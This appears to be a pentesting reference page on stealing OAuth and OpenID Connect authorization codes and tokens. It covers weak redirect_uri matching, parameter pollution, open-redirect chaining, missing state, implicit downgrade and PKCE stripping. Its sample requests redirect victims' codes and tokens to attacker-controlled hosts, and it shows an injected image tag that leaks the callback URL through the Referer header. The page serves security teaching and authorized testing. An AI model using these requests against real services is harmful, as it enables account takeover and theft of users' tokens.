---
title: "Attacking OAuth and OpenID Connect: redirect_uri abuse, missing state, and code/token theft"
description: "How a pentester steals authorization codes and tokens from OAuth/OIDC relying parties: weak redirect_uri validation, open-redirect chaining, missing state/nonce, implicit downgrade, and PKCE stripping."
keywords:
  - OAuth
  - OpenID Connect
  - redirect_uri
  - account takeover
  - state CSRF
  - PKCE
---

# OAuth redirect misconfiguration

Relying-party (client) bugs in the OAuth 2.0 / OpenID Connect (OIDC) authorization-code flow that let an attacker steal a victim's authorization code or token, or bind the victim's account to an attacker-controlled identity. The result is **account takeover**, often pre-authentication and without any victim interaction beyond loading a link.

## Overview

In the authorization-code flow, the client redirects the browser to the authorization server (AS) `/authorize` with `client_id`, `redirect_uri`, `response_type=code`, `scope`, and (for OIDC/public clients) `state`, `nonce`, and PKCE (`code_challenge`). After the user authenticates and consents, the AS redirects back to `redirect_uri` with `?code=…&state=…`; the client's backend then exchanges the code (plus `client_secret` or the PKCE `code_verifier`) for tokens.

Two parameters carry the security of the whole dance: **`redirect_uri`** (where the code is delivered, which must be validated by exact match) and **`state`** (an unguessable value bound to the user's session that defends the callback against CSRF). The OAuth 2.0 Security BCP (RFC 9700 section 2.1) requires **exact string matching** of `redirect_uri`, with the sole exception of a variable port for `localhost` native apps. Nearly every attack below is a relaxation of that rule or a missing `state`/`nonce`/PKCE check.

## How it works

`redirect_uri` validation breaks wherever the AS does anything weaker than exact match:

- **Prefix / substring / "starts-with"**: registered `https://client.com/callback` accepts `https://client.com.attacker.net/callback` or `https://client.com/callback.attacker.com`.
- **Subdirectory tolerance**: any path on the host is accepted; pivot via an open redirector or an HTML-injection page on that host.
- **Wildcard / regex flaws**: `https://*.site.example/*` may permit `https://attacker.example/.site.example`; unescaped `.` in regex.
- **URL-parser discrepancies** between validator and browser: `https://client.com&@attacker.net#@x.attacker.net/`, `@` userinfo, backslashes, encoded characters.
- **Parameter pollution**: two `redirect_uri` values; the validator reads one, the redirect uses the other.
- **Scheme downgrade**: an `http://` callback enables network interception.

## Exploitation

### Direct code theft via redirect_uri

Point `redirect_uri` at your server. If the AS still holds a live session for the victim and skips re-consent, the code is delivered to you:

```
GET /authorize?client_id=12345
  &redirect_uri=https://client-app.com.attacker.net/callback
  &response_type=code&scope=openid%20profile&state=xyz HTTP/1.1
Host: oauth-as.com

→ 302 https://client-app.com.attacker.net/callback?code=VICTIM_CODE&state=xyz
```

Your server logs `VICTIM_CODE`. The code is then useful only where you can actually exchange it, because an OAuth-compliant token endpoint binds the code to the `redirect_uri` sent at `/authorize` and will reject an exchange that presents a different one. That condition is met when any of the following holds: the token endpoint does not enforce `redirect_uri` binding; the client is a **public client without PKCE**, so you exchange the code yourself at the token endpoint using the attacker-controlled `redirect_uri` and the public `client_id` (no secret needed); or you have obtained the `client_secret`. A fresh attacker-chosen `state` does not stop the theft, because the attacker controls their own value.

**Parameter pollution** variant:

```
GET /authorize?client_id=12345
  &redirect_uri=https://client-app.com/callback
  &redirect_uri=https://attacker.net&response_type=code&scope=openid HTTP/1.1
```

### Open-redirect chaining and Referer leakage

When external redirect targets are blocked, chain an **open redirector** on a whitelisted host (`?returnUrl=`, `?redirect_to=`); with fragment reattachment a token in the URL fragment survives onto the attacker domain. Alternatively, set `redirect_uri` to a whitelisted page where you can inject `<img src="https://attacker.net">`: some browsers leak the full callback URL (including `?code=`) in the `Referer`. Third-party JavaScript on the callback page can leak it the same way (the Detectify/LastPass case).

### Missing state to login CSRF / identity binding

If `state` is absent or never verified, capture *your own* authorization code, then trick the victim into loading `…/callback?code=ATTACKER_CODE`. The victim's client account silently binds to the **attacker's** identity-provider account; the attacker later logs in and sees everything the victim adds. RFC 9700 section 4.7.1 notes that if the attacker can read the response they can also replay a leaked `state`, so only PKCE robustly defends this.

### Implicit downgrade and PKCE stripping

Flip `response_type=code` to `token` to receive the token directly in the fragment, where leakage is easier:

```
GET /authorize?...&response_type=token&scope=openid%20email&state=xyz
→ 302 …/callback#access_token=VICTIM_TOKEN&token_type=Bearer
```

Where PKCE is not enforced, strip `code_challenge` or downgrade `S256` to `plain` to enable code injection.

### Token / identity-binding confusion

A client that exchanges or accepts a token without verifying its `aud`/`iss`/issuing client can be fed a code or token minted for a *different* application and upgrade it to a first-party session (the Salt Labs "Oh-Auth" Grammarly/Vidio/Bukalapak and Booking.com cases). A related path is **pre-account-takeover**: register at the IdP with the victim's unverified email; a client that trusts the IdP-asserted email merges you into the victim's account.

## Tools

- **Burp Suite** (Repeater/Intruder; the EsPReSSO and OAuthScan-style extensions for flow analysis).
- A controlled **exploit server** to receive redirected codes/tokens during authorized testing.

## References

- PortSwigger Web Security Academy: [OAuth 2.0 authentication vulnerabilities](https://portswigger.net/web-security/oauth)
- RFC 9700: [Best Current Practice for OAuth 2.0 Security](https://www.rfc-editor.org/rfc/rfc9700.html); RFC 6749: [The OAuth 2.0 Authorization Framework](https://www.rfc-editor.org/rfc/rfc6749); RFC 7636: [PKCE](https://www.rfc-editor.org/rfc/rfc7636)
- OpenID Connect Core 1.0: [`nonce` sections 3.1.3.7, 15.5.2](https://openid.net/specs/openid-connect-core-1_0.html)
- Salt Labs: [Oh-Auth: Abusing OAuth to take over millions of accounts](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts)
- Detectify Labs: [How I made LastPass give me all your passwords](https://labs.detectify.com/writeups/how-i-made-lastpass-give-me-all-your-passwords/)
